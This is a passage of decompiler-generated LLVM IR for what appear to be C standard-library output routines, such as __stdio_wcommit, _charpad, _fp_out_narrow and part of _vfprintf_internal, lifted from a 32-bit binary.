  store i32 %v1_804a65b, i32* %eax.global-to-local, align 4
  %v0_804a660 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a660 = add i32 %v0_804a660, 32
  %v2_804a660 = inttoptr i32 %v1_804a660 to i32*
  %storemerge = load i32, i32* %v2_804a660, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804a666 = icmp eq i32 %storemerge, 0
  %v1_804a668 = icmp eq i1 %v1_804a666, false
  br i1 %v1_804a668, label %dec_label_pc_804a629, label %dec_label_pc_804a663.dec_label_pc_804a686.preheader_crit_edge

dec_label_pc_804a663.dec_label_pc_804a686.preheader_crit_edge: ; preds = %dec_label_pc_804a650
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  br label %dec_label_pc_804a686.preheader

dec_label_pc_804a686.preheader:                   ; preds = %dec_label_pc_804a663.dec_label_pc_804a686.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804a663.dec_label_pc_804a686.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804a6863 = icmp eq i32 %storemerge12, 0
  %v1_804a68810 = icmp eq i1 %v1_804a6863, false
  br i1 %v1_804a68810, label %dec_label_pc_804a672.preheader, label %dec_label_pc_804a68a

dec_label_pc_804a672.preheader:                   ; preds = %dec_label_pc_804a686.preheader
  br label %dec_label_pc_804a672

dec_label_pc_804a672:                             ; preds = %dec_label_pc_804a672.preheader, %dec_label_pc_804a683
  %v0_804a67a = phi i32 [ %storemerge1, %dec_label_pc_804a683 ], [ %storemerge12, %dec_label_pc_804a672.preheader ]
  %v1_804a672 = inttoptr i32 %v0_804a67a to i8*
  %v2_804a672 = load i8, i8* %v1_804a672, align 1
  %v3_804a672 = and i8 %v2_804a672, 64
  %v4_804a672 = icmp eq i8 %v3_804a672, 0
  br i1 %v4_804a672, label %dec_label_pc_804a683, label %dec_label_pc_804a677

dec_label_pc_804a677:                             ; preds = %dec_label_pc_804a672
  %v1_804a67b = call i32 @__stdio_wcommit(i32 %v0_804a67a)
  store i32 %v1_804a67b, i32* %eax.global-to-local, align 4
  %v0_804a683.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a683

dec_label_pc_804a683:                             ; preds = %dec_label_pc_804a672, %dec_label_pc_804a677
  %v0_804a683 = phi i32 [ %v0_804a67a, %dec_label_pc_804a672 ], [ %v0_804a683.pre, %dec_label_pc_804a677 ]
  %v1_804a683 = add i32 %v0_804a683, 32
  %v2_804a683 = inttoptr i32 %v1_804a683 to i32*
  %storemerge1 = load i32, i32* %v2_804a683, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804a686 = icmp eq i32 %storemerge1, 0
  %v1_804a688 = icmp eq i1 %v1_804a686, false
  br i1 %v1_804a688, label %dec_label_pc_804a672, label %dec_label_pc_804a68a

dec_label_pc_804a68a:                             ; preds = %dec_label_pc_804a683, %dec_label_pc_804a686.preheader
  %v2_804a68a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804a68a, i32* %eax.global-to-local, align 4
  %v2_804a68b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804a68b, i32* @ebx, align 4
  store i32 %v0_804a606, i32* @esi, align 4
  ret i32 %v2_804a68a

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 2, 3 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804a683, { 1, 0 }
  uselistorder label %dec_label_pc_804a672, { 1, 0 }
  uselistorder label %dec_label_pc_804a650, { 1, 0 }
  uselistorder label %dec_label_pc_804a629, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804a690 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804a698 = add i32 %arg1, 8
  %v2_804a698 = inttoptr i32 %v1_804a698 to i32*
  %v3_804a698 = load i32, i32* %v2_804a698, align 4
  store i32 %v3_804a698, i32* %edx.global-to-local, align 4
  %v1_804a69b = add i32 %arg1, 16
  %v2_804a69b = inttoptr i32 %v1_804a69b to i32*
  %v3_804a69b = load i32, i32* %v2_804a69b, align 4
  %v2_804a69e = sub i32 %v3_804a69b, %v3_804a698
  %v12_804a69e = icmp eq i32 %v2_804a69e, 0
  store i32 %v2_804a69e, i32* %eax.global-to-local, align 4
  br i1 %v12_804a69e, label %dec_label_pc_804a6b1, label %dec_label_pc_804a6a2

dec_label_pc_804a6a2:                             ; preds = %entry
  store i32 %v3_804a698, i32* %v2_804a69b, align 4
  %v0_804a6a5 = load i32, i32* @ecx, align 4
  %v0_804a6a6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804a6a7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804a6a8 = load i32, i32* @ebx, align 4
  %v4_804a6a9 = inttoptr i32 %v0_804a6a8 to i16*
  %v5_804a6a9 = call i32 @__stdio_WRITE(i16* %v4_804a6a9, i32 %v0_804a6a7, i32 %v0_804a6a6, i32 %v0_804a6a5)
  store i32 %v5_804a6a9, i32* %eax.global-to-local, align 4
  %v0_804a6b1.pre = load i32, i32* @ebx, align 4
  %v2_804a6b7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804a6b1

dec_label_pc_804a6b1:                             ; preds = %entry, %dec_label_pc_804a6a2
  %v2_804a6b7 = phi i32 [ %tmp11, %entry ], [ %v2_804a6b7.pre, %dec_label_pc_804a6a2 ]
  %v0_804a6b1 = phi i32 [ %arg1, %entry ], [ %v0_804a6b1.pre, %dec_label_pc_804a6a2 ]
  %v1_804a6b1 = add i32 %v0_804a6b1, 16
  %v2_804a6b1 = inttoptr i32 %v1_804a6b1 to i32*
  %v3_804a6b1 = load i32, i32* %v2_804a6b1, align 4
  store i32 %v3_804a6b1, i32* %eax.global-to-local, align 4
  %v2_804a6b4 = add i32 %v0_804a6b1, 8
  %v3_804a6b4 = inttoptr i32 %v2_804a6b4 to i32*
  %v4_804a6b4 = load i32, i32* %v3_804a6b4, align 4
  %v5_804a6b4 = sub i32 %v3_804a6b1, %v4_804a6b4
  store i32 %v5_804a6b4, i32* %eax.global-to-local, align 4
  store i32 %v2_804a6b7, i32* @edx, align 4
  store i32 %v0_804a690, i32* @ebx, align 4
  ret i32 %v5_804a6b4

; uselistorder directives
  uselistorder i32 %v0_804a6b1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804a6b1, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804a6bc = load i32, i32* @edi, align 4
  %v0_804a6bd = load i32, i32* @eax, align 4
  store i32 %v0_804a6bd, i32* @edi, align 4
  %v0_804a6bf = load i32, i32* @esi, align 4
  %v0_804a6c0 = load i32, i32* @ecx, align 4
  store i32 %v0_804a6c0, i32* @esi, align 4
  %v0_804a6c2 = load i32, i32* @ebx, align 4
  store i32 %v0_804a6c0, i32* @ebx, align 4
  %v0_804a6c8 = load i32, i32* @edx, align 4
  store i32 %v0_804a6c8, i32* %stack_var_-13, align 4
  %v1_804a6cf2 = icmp eq i32 %v0_804a6c0, 0
  br i1 %v1_804a6cf2, label %dec_label_pc_804a6e7, label %dec_label_pc_804a6d3.lr.ph

dec_label_pc_804a6d3.lr.ph:                       ; preds = %entry
  %v2_804a6d3 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804a6d3

dec_label_pc_804a6ce:                             ; preds = %dec_label_pc_804a6d3
  %v1_804a6ce = add i32 %v0_804a6ce, -1
  %v8_804a6ce = icmp eq i32 %v1_804a6ce, 0
  store i32 %v1_804a6ce, i32* @ebx, align 4
  br i1 %v8_804a6ce, label %dec_label_pc_804a6e7.loopexit, label %dec_label_pc_804a6ce.dec_label_pc_804a6d3_crit_edge

dec_label_pc_804a6ce.dec_label_pc_804a6d3_crit_edge: ; preds = %dec_label_pc_804a6ce
  %v0_804a6d7.pre = load i32, i32* @edx, align 4
  %v0_804a6d8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a6d3

dec_label_pc_804a6d3:                             ; preds = %dec_label_pc_804a6ce.dec_label_pc_804a6d3_crit_edge, %dec_label_pc_804a6d3.lr.ph
  %v0_804a6d8 = phi i32 [ %v0_804a6d8.pre, %dec_label_pc_804a6ce.dec_label_pc_804a6d3_crit_edge ], [ %v0_804a6bd, %dec_label_pc_804a6d3.lr.ph ]
  %v0_804a6d7 = phi i32 [ %v0_804a6d7.pre, %dec_label_pc_804a6ce.dec_label_pc_804a6d3_crit_edge ], [ %v0_804a6c8, %dec_label_pc_804a6d3.lr.ph ]
  %v4_804a6dc = call i32 @__stdio_fwrite(i32 %v2_804a6d3, i32 1, i32 %v0_804a6d8, i32 %v0_804a6d7)
  %v8_804a6e4 = icmp eq i32 %v4_804a6dc, 1
  %v0_804a6ce = load i32, i32* @ebx, align 4
  br i1 %v8_804a6e4, label %dec_label_pc_804a6ce, label %dec_label_pc_804a6e7.loopexit

dec_label_pc_804a6e7.loopexit:                    ; preds = %dec_label_pc_804a6ce, %dec_label_pc_804a6d3
  %v1_804a6ea.ph = phi i32 [ %v0_804a6ce, %dec_label_pc_804a6d3 ], [ 0, %dec_label_pc_804a6ce ]
  %v0_804a6ea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a6e7

dec_label_pc_804a6e7:                             ; preds = %dec_label_pc_804a6e7.loopexit, %entry
  %v0_804a6ea = phi i32 [ 0, %entry ], [ %v0_804a6ea.pre, %dec_label_pc_804a6e7.loopexit ]
  %v1_804a6ea = phi i32 [ 0, %entry ], [ %v1_804a6ea.ph, %dec_label_pc_804a6e7.loopexit ]
  %v2_804a6ea = sub i32 %v0_804a6ea, %v1_804a6ea
  store i32 %v0_804a6c2, i32* @ebx, align 4
  store i32 %v0_804a6bf, i32* @esi, align 4
  store i32 %v0_804a6bc, i32* @edi, align 4
  ret i32 %v2_804a6ea

; uselistorder directives
  uselistorder i32 %v1_804a6ce, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804a6e7.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804a705 = trunc i32 %arg2 to i8
  %v5_804a705 = icmp slt i8 %v3_804a705, 0
  %v1_804a707 = icmp eq i1 %v5_804a705, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804a707, label %dec_label_pc_804a738, label %dec_label_pc_804a709

dec_label_pc_804a709:                             ; preds = %entry
  %v3_804a710 = call i32 @strlen(i8* %arg4)
  %v0_804a718 = load i32, i32* @ebx, align 4
  %v2_804a718 = sub i32 %v0_804a718, %v3_804a710
  store i32 %v2_804a718, i32* @ebx, align 4
  store i32 %v3_804a710, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804a718, 1
  br i1 %tmp23, label %dec_label_pc_804a736, label %dec_label_pc_804a720

dec_label_pc_804a720:                             ; preds = %dec_label_pc_804a709
  store i32 %arg1, i32* @eax, align 4
  %v0_804a724 = load i32, i32* @edi, align 4
  %v1_804a724 = urem i32 %v0_804a724, 128
  store i32 %v1_804a724, i32* @edi, align 4
  store i32 %v2_804a718, i32* @ecx, align 4
  store i32 %v1_804a724, i32* @edx, align 4
  %v0_804a72b = call i32 @_charpad()
  %v12_804a730 = icmp eq i32 %v0_804a72b, %v2_804a718
  store i32 %v0_804a72b, i32* @ebp, align 4
  %v1_804a734 = icmp eq i1 %v12_804a730, false
  br i1 %v1_804a734, label %dec_label_pc_804a752, label %dec_label_pc_804a720.dec_label_pc_804a736_crit_edge

dec_label_pc_804a720.dec_label_pc_804a736_crit_edge: ; preds = %dec_label_pc_804a720
  %v0_804a736.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a736

dec_label_pc_804a736:                             ; preds = %dec_label_pc_804a720.dec_label_pc_804a736_crit_edge, %dec_label_pc_804a709
  %v0_804a736 = phi i32 [ %v0_804a736.pre, %dec_label_pc_804a720.dec_label_pc_804a736_crit_edge ], [ %v3_804a710, %dec_label_pc_804a709 ]
  store i32 %v0_804a736, i32* @ebx, align 4
  br label %dec_label_pc_804a738

dec_label_pc_804a738:                             ; preds = %entry, %dec_label_pc_804a736
  %v0_804a743 = phi i32 [ %arg3, %entry ], [ %v0_804a736, %dec_label_pc_804a736 ]
  %tmp24 = icmp slt i32 %v0_804a743, 1
  br i1 %tmp24, label %dec_label_pc_804a750, label %dec_label_pc_804a73e

dec_label_pc_804a73e:                             ; preds = %dec_label_pc_804a738
  %v0_804a73e = load i32, i32* @ecx, align 4
  %v5_804a748 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804a743, i32 %arg1, i32 %v0_804a73e)
  br label %dec_label_pc_804a750

dec_label_pc_804a750:                             ; preds = %dec_label_pc_804a738, %dec_label_pc_804a73e
  %v1_804a750 = phi i32 [ 0, %dec_label_pc_804a738 ], [ %v5_804a748, %dec_label_pc_804a73e ]
  %v0_804a750 = load i32, i32* @ebp, align 4
  %v2_804a750 = add i32 %v0_804a750, %v1_804a750
  br label %dec_label_pc_804a752

dec_label_pc_804a752:                             ; preds = %dec_label_pc_804a720, %dec_label_pc_804a750
  %v0_804a755 = phi i32 [ %v0_804a72b, %dec_label_pc_804a720 ], [ %v2_804a750, %dec_label_pc_804a750 ]
  ret i32 %v0_804a755

; uselistorder directives
  uselistorder i32 %v0_804a743, { 1, 0 }
  uselistorder i32 %v0_804a72b, { 1, 2, 0 }
  uselistorder i32 %v1_804a724, { 1, 0 }
  uselistorder i32 %v2_804a718, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804a752, { 1, 0 }
  uselistorder label %dec_label_pc_804a750, { 1, 0 }
  uselistorder label %dec_label_pc_804a738, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a75f = load i32, i32* @ebx, align 4
  store i32 %v0_804a75f, i32* %stack_var_-16, align 4
  %v4_804a75f = ptrtoint i32* %stack_var_-16 to i32
  %v1_804a760 = add i32 %v4_804a75f, -356
  %v10_804a760 = icmp slt i32 %v1_804a760, 0
  store i1 %v10_804a760, i1* %sf.global-to-local, align 1
  %v4_804a766 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804a766, i32* @ebx, align 4
  %v2_804a76e = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804a76e, i32* @esi, align 4
  %v5_804a773 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804a766)
  store i32 %v5_804a773, i32* %eax.global-to-local, align 4
  %v2_804a77b = icmp slt i32 %v5_804a773, 0
  store i1 %v2_804a77b, i1* %sf.global-to-local, align 1
  %v1_804a77d = icmp eq i1 %v2_804a77b, false
  br i1 %v1_804a77d, label %dec_label_pc_804a7bd, label %dec_label_pc_804a77f

dec_label_pc_804a77f:                             ; preds = %entry
  %v12_804a778 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804a77f = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804a77f, i32* @ebx, align 4
  %v1_804a783 = add i32 %v12_804a778, -12
  %v10_804a783 = icmp slt i32 %v1_804a783, 0
  store i1 %v10_804a783, i1* %sf.global-to-local, align 1
  %v5_804a786 = inttoptr i32 %v3_804a77f to i8*
  %v3_804a787 = call i32 @strlen(i8* %v5_804a786)
  store i32 %v3_804a787, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804a796 = icmp eq i32 %v3_804a787, 0
  %v2_804a796 = icmp slt i32 %v3_804a787, 0
  store i1 %v2_804a796, i1* %sf.global-to-local, align 1
  br i1 %v1_804a796, label %dec_label_pc_804ad06, label %dec_label_pc_804a79e

dec_label_pc_804a79e:                             ; preds = %dec_label_pc_804a77f
  %v0_804a79e = load i32, i32* @edx, align 4
  %v0_804a7a7 = load i32, i32* @ebx, align 4
  %v6_804a7a8 = call i32 @__stdio_fwrite(i32 %v0_804a7a7, i32 %v3_804a787, i32 %arg1, i32 %v0_804a79e)
  store i32 %v6_804a7a8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804a7b5 = load i32, i32* @esp, align 4
  %v1_804a7b5 = add i32 %v0_804a7b5, 16
  %v7_804a7b5 = icmp slt i32 %v1_804a7b5, 0
  store i1 %v7_804a7b5, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ad06

dec_label_pc_804a7bd:                             ; preds = %entry
  %v6_804a7c7 = call i32 @_ppfs_prepargs(i32 %v2_804a76e, i32 %arg3, i32 %v5_804a773, i32 %v5_804a773)
  store i32 %v6_804a7c7, i32* %eax.global-to-local, align 4
  %v0_804a7cc = load i32, i32* @ebx, align 4
  store i32 %v0_804a7cc, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804a7d6 = load i32, i32* @esp, align 4
  %v1_804a7d6 = add i32 %v0_804a7d6, 16
  %v7_804a7d6 = icmp slt i32 %v1_804a7d6, 0
  store i1 %v7_804a7d6, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804a7dc

dec_label_pc_804a7db:                             ; preds = %dec_label_pc_804a7e2
  %v1_804a7db = add i32 %v0_804a7ea, 1
  %v9_804a7db = icmp slt i32 %v1_804a7db, 0
  store i1 %v9_804a7db, i1* %sf.global-to-local, align 1
  store i32 %v1_804a7db, i32* @ebx, align 4
  br label %dec_label_pc_804a7dc.backedge

dec_label_pc_804a7dc.backedge:                    ; preds = %dec_label_pc_804a7db, %dec_label_pc_804acec, %dec_label_pc_804acf7
  %v1_804a7e620 = phi i32 [ %v1_804a7ee, %dec_label_pc_804a7db ], [ %v3_804acec, %dec_label_pc_804acec ], [ %v1_804a81a, %dec_label_pc_804acf7 ]
  %v0_804a7dc18 = phi i32 [ %v1_804a7db, %dec_label_pc_804a7db ], [ %v3_804acec, %dec_label_pc_804acec ], [ %v1_804acf7, %dec_label_pc_804acf7 ]
  %v4_804a7dc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a7dc

dec_label_pc_804a7dc:                             ; preds = %dec_label_pc_804a7dc.backedge, %dec_label_pc_804a7bd
  %v1_804a7ee = phi i32 [ %v1_804a7e620, %dec_label_pc_804a7dc.backedge ], [ %v0_804a7cc, %dec_label_pc_804a7bd ]
  %v0_804a7ea = phi i32 [ %v0_804a7dc18, %dec_label_pc_804a7dc.backedge ], [ %v0_804a7cc, %dec_label_pc_804a7bd ]
  %v4_804a7dc = phi i32 [ %v4_804a7dc.pre, %dec_label_pc_804a7dc.backedge ], [ %v6_804a7c7, %dec_label_pc_804a7bd ]
  %v1_804a7dc = inttoptr i32 %v0_804a7ea to i8*
  %v2_804a7dc = load i8, i8* %v1_804a7dc, align 1
  %v3_804a7dc = zext i8 %v2_804a7dc to i32
  %v5_804a7dc = and i32 %v4_804a7dc, -256
  %v6_804a7dc = or i32 %v3_804a7dc, %v5_804a7dc
  store i32 %v6_804a7dc, i32* %eax.global-to-local, align 4
  %v4_804a7de = icmp eq i8 %v2_804a7dc, 0
  %v5_804a7de = icmp slt i8 %v2_804a7dc, 0
  store i1 %v5_804a7de, i1* %sf.global-to-local, align 1
  br i1 %v4_804a7de, label %dec_label_pc_804a7e6, label %dec_label_pc_804a7e2

dec_label_pc_804a7e2:                             ; preds = %dec_label_pc_804a7dc
  %v2_804a7e2 = add i8 %v2_804a7dc, -37
  %v10_804a7e2 = icmp eq i8 %v2_804a7e2, 0
  %v11_804a7e2 = icmp slt i8 %v2_804a7e2, 0
  store i1 %v11_804a7e2, i1* %sf.global-to-local, align 1
  %v1_804a7e4 = icmp eq i1 %v10_804a7e2, false
  br i1 %v1_804a7e4, label %dec_label_pc_804a7db, label %dec_label_pc_804a7e6

dec_label_pc_804a7e6:                             ; preds = %dec_label_pc_804a7e2, %dec_label_pc_804a7dc
  %v2_804a7e6 = sub i32 %v0_804a7ea, %v1_804a7ee
  %v12_804a7e6 = icmp eq i32 %v2_804a7e6, 0
  %v13_804a7e6 = icmp slt i32 %v2_804a7e6, 0
  store i1 %v13_804a7e6, i1* %sf.global-to-local, align 1
  br i1 %v12_804a7e6, label %dec_label_pc_804a811, label %dec_label_pc_804a7ea

dec_label_pc_804a7ea:                             ; preds = %dec_label_pc_804a7e6
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a7e6, i32* @esi, align 4
  store i1 %v13_804a7e6, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_804a7e6, 1
  br i1 %tmp65, label %dec_label_pc_804a806, label %dec_label_pc_804a7f4

dec_label_pc_804a7f4:                             ; preds = %dec_label_pc_804a7ea
  %v0_804a7f4 = load i32, i32* @ebp, align 4
  %v1_804a7f4 = load i32, i32* @esp, align 4
  %v2_804a7f4 = add i32 %v1_804a7f4, -4
  %v3_804a7f4 = inttoptr i32 %v2_804a7f4 to i32*
  store i32 %v0_804a7f4, i32* %v3_804a7f4, align 4
  %v1_804a7f5 = add i32 %v1_804a7f4, 368
  %v2_804a7f5 = inttoptr i32 %v1_804a7f5 to i32*
  %v3_804a7f5 = load i32, i32* %v2_804a7f5, align 4
  %v5_804a7f5 = add i32 %v1_804a7f4, -8
  %v6_804a7f5 = inttoptr i32 %v5_804a7f5 to i32*
  store i32 %v3_804a7f5, i32* %v6_804a7f5, align 4
  %v0_804a7fc = load i32, i32* @esi, align 4
  %v2_804a7fc = add i32 %v1_804a7f4, -12
  %v3_804a7fc = inttoptr i32 %v2_804a7fc to i32*
  store i32 %v0_804a7fc, i32* %v3_804a7fc, align 4
  %v0_804a7fd = load i32, i32* %edx.global-to-local, align 4
  %v2_804a7fd = add i32 %v1_804a7f4, -16
  %v3_804a7fd = inttoptr i32 %v2_804a7fd to i32*
  store i32 %v0_804a7fd, i32* %v3_804a7fd, align 4
  %v0_804a7fe = load i32, i32* %stack_var_-364, align 4
  %v4_804a7fe = call i32 @__stdio_fwrite(i32 %v0_804a7fe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a7fe, i32* %eax.global-to-local, align 4
  %v0_804a803 = load i32, i32* @esp, align 4
  %v1_804a803 = add i32 %v0_804a803, 16
  %v7_804a803 = icmp slt i32 %v1_804a803, 0
  store i1 %v7_804a803, i1* %sf.global-to-local, align 1
  %v1_804a806.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a806

dec_label_pc_804a806:                             ; preds = %dec_label_pc_804a7ea, %dec_label_pc_804a7f4
  %v3_804a80e = phi i32 [ %v2_804a7e6, %dec_label_pc_804a7ea ], [ %v1_804a806.pre, %dec_label_pc_804a7f4 ]
  %v0_804a806 = phi i32 [ 0, %dec_label_pc_804a7ea ], [ %v4_804a7fe, %dec_label_pc_804a7f4 ]
  %v2_804a806 = sub i32 %v0_804a806, %v3_804a80e
  %v12_804a806 = icmp eq i32 %v2_804a806, 0
  %v13_804a806 = icmp slt i32 %v2_804a806, 0
  store i1 %v13_804a806, i1* %sf.global-to-local, align 1
  %v1_804a808 = icmp eq i1 %v12_804a806, false
  %v0_804acff.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804a808, label %dec_label_pc_804acff, label %dec_label_pc_804a80e

dec_label_pc_804a80e:                             ; preds = %dec_label_pc_804a806
  %v1_804a80e = inttoptr i32 %v0_804acff.pre.pre to i32*
  %v2_804a80e = load i32, i32* %v1_804a80e, align 4
  %v4_804a80e = add i32 %v2_804a80e, %v3_804a80e
  %v15_804a80e = icmp slt i32 %v4_804a80e, 0
  store i1 %v15_804a80e, i1* %sf.global-to-local, align 1
  store i32 %v4_804a80e, i32* %v1_804a80e, align 4
  %v0_804a811.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a811

dec_label_pc_804a811:                             ; preds = %dec_label_pc_804a7e6, %dec_label_pc_804a80e
  %v0_804acf7 = phi i32 [ %v0_804a7ea, %dec_label_pc_804a7e6 ], [ %v0_804a811.pre, %dec_label_pc_804a80e ]
  %v1_804a811 = inttoptr i32 %v0_804acf7 to i8*
  %v2_804a811 = load i8, i8* %v1_804a811, align 1
  %v3_804a811 = icmp eq i8 %v2_804a811, 0
  %v4_804a811 = icmp slt i8 %v2_804a811, 0
  store i1 %v4_804a811, i1* %sf.global-to-local, align 1
  br i1 %v3_804a811, label %dec_label_pc_804ad06, label %dec_label_pc_804a81a

dec_label_pc_804a81a:                             ; preds = %dec_label_pc_804a811
  %v1_804a81a = add i32 %v0_804acf7, 1
  %v2_804a81a = inttoptr i32 %v1_804a81a to i8*
  %v3_804a81a = load i8, i8* %v2_804a81a, align 1
  %v4_804a81a = add i8 %v3_804a81a, -37
  %v12_804a81a = icmp eq i8 %v4_804a81a, 0
  %v13_804a81a = icmp slt i8 %v4_804a81a, 0
  store i1 %v13_804a81a, i1* %sf.global-to-local, align 1
  store i32 %v1_804a81a, i32* %edx.global-to-local, align 4
  br i1 %v12_804a81a, label %dec_label_pc_804acf7, label %dec_label_pc_804a827

dec_label_pc_804a827:                             ; preds = %dec_label_pc_804a81a
  %v1_804a827 = load i32, i32* @esp, align 4
  %v2_804a827 = add i32 %v1_804a827, 16
  %v3_804a827 = inttoptr i32 %v2_804a827 to i32*
  store i32 %v1_804a81a, i32* %v3_804a827, align 4
  %v0_804a82b = load i32, i32* @esp, align 4
  %v1_804a82b = add i32 %v0_804a82b, 340
  %v2_804a82b = inttoptr i32 %v1_804a82b to i32*
  store i32 0, i32* %v2_804a82b, align 4
  %v0_804a836 = load i32, i32* @esp, align 4
  %v1_804a836 = add i32 %v0_804a836, -12
  %v10_804a836 = icmp slt i32 %v1_804a836, 0
  store i1 %v10_804a836, i1* %sf.global-to-local, align 1
  %v1_804a839 = add i32 %v0_804a836, 16
  store i32 %v1_804a839, i32* @ebx, align 4
  %v2_804a83d = add i32 %v0_804a836, -16
  %v3_804a83d = inttoptr i32 %v2_804a83d to i32*
  store i32 %v1_804a839, i32* %v3_804a83d, align 4
  %v0_804a83e = load i32, i32* %stack_var_-364, align 4
  %v1_804a83e = inttoptr i32 %v0_804a83e to i32*
  %v2_804a83e = call i32 @_ppfs_parsespec(i32* %v1_804a83e)
  store i32 %v2_804a83e, i32* %eax.global-to-local, align 4
  %v0_804a843 = load i32, i32* @ebx, align 4
  %v1_804a843 = load i32, i32* @esp, align 4
  %v2_804a843 = inttoptr i32 %v1_804a843 to i32*
  store i32 %v0_804a843, i32* %v2_804a843, align 4
  %v0_804a846 = load i32, i32* %stack_var_-364, align 4
  %v1_804a846 = call i32 @_ppfs_setargs(i32 %v0_804a846)
  store i32 %v1_804a846, i32* %eax.global-to-local, align 4
  %v0_804a84b = load i32, i32* @esp, align 4
  %v1_804a84b = add i32 %v0_804a84b, 70
  %v2_804a84b = inttoptr i32 %v1_804a84b to i8*
  %v3_804a84b = load i8, i8* %v2_804a84b, align 1
  %v4_804a84b = zext i8 %v3_804a84b to i32
  store i32 %v4_804a84b, i32* @edi, align 4
  %v1_804a850 = add i32 %v0_804a84b, 16
  %v1_804a853 = add i32 %v0_804a84b, 56
  %v2_804a853 = inttoptr i32 %v1_804a853 to i32*
  %v3_804a853 = load i32, i32* %v2_804a853, align 4
  %v5_804a853 = icmp slt i32 %v3_804a853, 0
  store i1 %v5_804a853, i1* %sf.global-to-local, align 1
  %v1_804a858 = add i32 %v0_804a84b, 112
  store i32 %v1_804a858, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_804a853, 1
  br i1 %tmp66, label %dec_label_pc_804a865, label %dec_label_pc_804a85e

dec_label_pc_804a85e:                             ; preds = %dec_label_pc_804a827
  %v2_804a85e = zext i8 %v3_804a84b to i32
  %v3_804a85e = mul nuw nsw i32 %v2_804a85e, 12
  store i32 %v3_804a85e, i32* %eax.global-to-local, align 4
  %v2_804a861 = add i32 %v0_804a84b, 100
  %v3_804a861 = add i32 %v2_804a861, %v3_804a85e
  store i32 %v3_804a861, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a865

dec_label_pc_804a865:                             ; preds = %dec_label_pc_804a827, %dec_label_pc_804a85e
  %v0_804a86d27 = phi i32 [ %v1_804a858, %dec_label_pc_804a827 ], [ %v3_804a861, %dec_label_pc_804a85e ]
  %v1_804a865 = add i32 %v0_804a84b, 60
  %v2_804a865 = inttoptr i32 %v1_804a865 to i32*
  %v3_804a865 = load i32, i32* %v2_804a865, align 4
  store i32 %v3_804a865, i32* %ecx.global-to-local, align 4
